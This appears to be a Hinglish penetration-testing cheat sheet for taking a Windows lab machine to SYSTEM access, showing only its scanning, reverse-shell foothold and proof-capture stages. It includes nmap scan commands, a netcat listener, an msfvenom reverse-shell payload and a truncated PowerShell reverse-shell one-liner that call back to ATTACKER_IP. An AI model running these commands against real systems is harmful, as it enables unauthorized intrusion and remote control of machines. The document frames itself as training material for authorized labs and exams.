Windows Full Access Playbook

Ek Windows target machine milne se lekar full SYSTEM access tak — poora step-by-step process, har stage ke tools aur commands ke saath.

01

Port Scanning & Enumeration

Start Here
  1. Full port scan sabse pehle: 
    nmap -sS -p- --min-rate=1000 -oG initial.txt TARGET_IP
  2. Discovered ports pe deep scan: 
    nmap -sV -sC -p PORT1,PORT2,PORT3 -oN detailed.txt TARGET_IP
  3. Windows-specific common ports check karo: 135 (RPC), 139/445 (SMB), 389 (LDAP — agar AD hai), 3389 (RDP), 5985 (WinRM)
  4. Full aggressive scan (optional, slow): 
    nmap -A -p- TARGET_IP

04

Establishing Foothold (Reverse Shell)

Access Confirm
  1. Listener start karo apne machine pe: 
    nc -lvnp 4444
  2. Payload generate karo (agar exploit ke through deliver karna hai): 
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe
  3. Ya PowerShell one-liner directly use karo (agar command exec mil chuka hai): 
    powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);..."
  4. Shell stabilize karo — proper terminal jaisa banane ke liye.

07

Full Access Confirm & Proof

Final Step
  1. SYSTEM confirm karo: 
    whoami
# Output: nt authority\system
  2. Proof files locate karke padho: 
    type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\\Desktop\local.txt
  3. Screenshot lo — dono files ka content + whoami output, report ke liye zaroori.
  4. Documentation karo — har step jo kiya (enumeration se access tak) note karte jaana, report mein use hoga.
Yaad rakh: Ye poora playbook sirf authorized lab machines (TryHackMe/HackTheBox/PG Practice/exam) ke liye hai — kabhi bhi bina permission ke kisi real system pe try mat karna.
